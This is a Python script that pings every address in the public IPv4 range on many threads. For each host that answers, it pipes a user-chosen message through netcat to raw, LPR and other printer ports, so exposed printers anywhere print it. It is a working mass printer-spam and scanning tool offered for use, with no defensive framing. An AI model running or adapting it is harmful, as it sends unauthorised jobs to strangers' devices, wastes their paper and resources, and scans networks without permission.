import sys
import os
import subprocess
from threading import Thread
from netaddr import iter_iprange
import threading
IP_range_Start = "1.0.0.0"
IP_range_Stop = "255.255.255.254"
try:
    words = sys.argv[1]
    thread_limit = int(sys.argv[2])
except:
    print ('script.py <words> <threads>')
    exit()
threadLock = threading.Lock()
with threadLock:
    generator = iter_iprange(IP_range_Start, IP_range_Stop, step=1)
def printit(num):
    for ips in generator:
            print ('Worker: %s Printing on - %s'%(num,ips))
            response = os.system("ping -w 1 -c 1 " + str(ips) + " > /var/tmp/printme/ping.log")
            if response == 0:
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 3 %s 9100'%(words,str(ips)))   #RAW
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 515'%(words,str(ips)))    #LPDSVC (accepts LPR)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 616'%(words,str(ips)))    #Standard Port Monitor (using SNMP)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 1023'%(words,str(ips)))   #Standard Port Monitor (using LPR)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 2000'%(words,str(ips)))   #Standard Port Monitor (using RAW)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 2501'%(words,str(ips)))   #Standard Port Monitor (using RAW)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 2503'%(words,str(ips)))   #Standard Port Monitor (using RAW)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 3001'%(words,str(ips)))   #Standard Port Monitor (using RAW)
                stdout = subprocess.getoutput('echo "%s" | netcat -s 0.0.0.0 -w 1 %s 6869'%(words,str(ips)))   #Standard Port Monitor (using RAW)
            else:
                pass
threads = []
for i in range(thread_limit):
    t = threading.Thread(target=printit, args=(i,))
    threads.append(t)
    t.start()
